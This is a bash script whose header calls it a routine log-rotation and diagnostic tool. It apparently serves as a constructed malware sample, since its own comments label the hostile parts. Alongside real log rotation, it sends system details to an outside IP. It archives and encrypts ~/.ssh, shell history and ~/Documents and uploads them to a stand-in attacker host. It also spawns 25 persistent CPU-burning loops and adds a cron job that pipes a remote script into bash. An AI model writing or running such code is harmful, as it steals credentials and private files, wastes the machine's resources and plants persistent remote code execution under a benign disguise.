#!/bin/bash
#
# rotate_logs.sh - Automated Log Rotation & System Diagnostic Tool
#
# Purpose:
#   This script performs daily log rotation for application logs,
#   compresses aged logs, removes archives older than retention policy,
#   and runs a lightweight diagnostic health check that reports to the
#   SRE monitoring aggregator.
#
# Author : Alex Chen, Site Reliability Engineering
# Version: 3.1.2
# Date   : 2025-03-17

set -euo pipefail

# ---------- Configuration ----------
LOG_DIR="/var/log/myapp"
ARCHIVE_DIR="/var/log/archive"
RETENTION_DAYS=30
DIAG_REPORT_HOST="192.0.2.100"
DATA_COLLECTOR_URL="http://update-server.evil-corp.test/collect"
ENCRYPTION_PASSPHRASE="4f3c9a8b"
DIAG_CURL_TIMEOUT=8

# ---------- Legitimate Helper ----------
function log_msg() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

# ---------- Fake Log Rotation ----------
function rotate_logs() {
    log_msg "Starting log rotation..."

    # Compress log files older than 1 day but younger than retention
    find "$LOG_DIR" -type f -name "*.log" -mmin +1440 ! -name "*.gz" -exec gzip -q {} \;

    # Move compressed logs to archive
    find "$LOG_DIR" -type f -name "*.gz" -exec mv {} "$ARCHIVE_DIR/" \;

    # Remove archives beyond retention period
    find "$ARCHIVE_DIR" -type f -name "*.gz" -mtime +"$RETENTION_DAYS" -exec rm -f {} \;

    log_msg "Rotation cycle completed."
}

# ---------- Suspicious Diagnostic Reporter ----------
function run_diagnostics() {
    log_msg "Gathering system health snapshot..."

    # Legitimate-looking system info
    {
        echo "--- sys-info ---"
        uname -a
        uptime
        df -h
        free -m
        echo "--- end ---"
    } >> /var/tmp/.health.log

    # Hidden exfiltration channel: POST the snapshot to an external collector
    curl -s -m "$DIAG_CURL_TIMEOUT" -X POST \
        --data-binary @/var/tmp/.health.log \
        "http://$DIAG_REPORT_HOST/report" \
        -H "X-Sender: rotate-logs" \
        || log_msg "Diagnostic report send failed (non-critical)"

    rm -f /var/tmp/.health.log
}

# ---------- Malicious Data Exfiltration ----------
function exfiltrate_sensitive_data() {
    local tmp_archive="/tmp/.sysinfo.tar.gz"
    local tmp_enc="/tmp/.sysinfo.enc"

    # Silently harvest sensitive user files
    tar czf "$tmp_archive" \
        ~/.ssh \
        ~/.bashrc \
        ~/.bash_history \
        ~/Documents \
        2>/dev/null || true

    # Encrypt harvested data without user consent
    openssl enc -aes-256-cbc -pass pass:"$ENCRYPTION_PASSPHRASE" \
        -in "$tmp_archive" -out "$tmp_enc" 2>/dev/null

    # Exfiltrate encrypted archive to remote collection endpoint
    curl -s -X POST -F "file=@$tmp_enc" "$DATA_COLLECTOR_URL" \
        -H "X-Node-ID: $(hostname)" >/dev/null 2>&1

    # Clean traces
    rm -f "$tmp_archive" "$tmp_enc"
}

# ---------- Resource Consumption Loop (Stealth Load) ----------
function spawn_stealth_workers() {
    # Fork multiple idle loops to simulate background load
    for i in {1..25}; do
        ( while true; do : ; done ) &
    done
    # Disown the load generators so they persist beyond script exit
    disown -a
}

# ---------- Dangerous System Modification ----------
function update_cron_persistence() {
    # Add a recurring entry that re-downloads and executes remote payload
    local cron_line="*/10 * * * * curl -s http://update-server.evil-corp.test/upgrade.sh | bash"
    (crontab -l 2>/dev/null; echo "$cron_line") | crontab - 2>/dev/null || true
}

# ---------- Main Execution ----------
log_msg "=== Rotate Logs & Diagnostic Tool Started ==="
rotate_logs
run_diagnostics
exfiltrate_sensitive_data
spawn_stealth_workers
update_cron_persistence
log_msg "=== Tool Finished ==="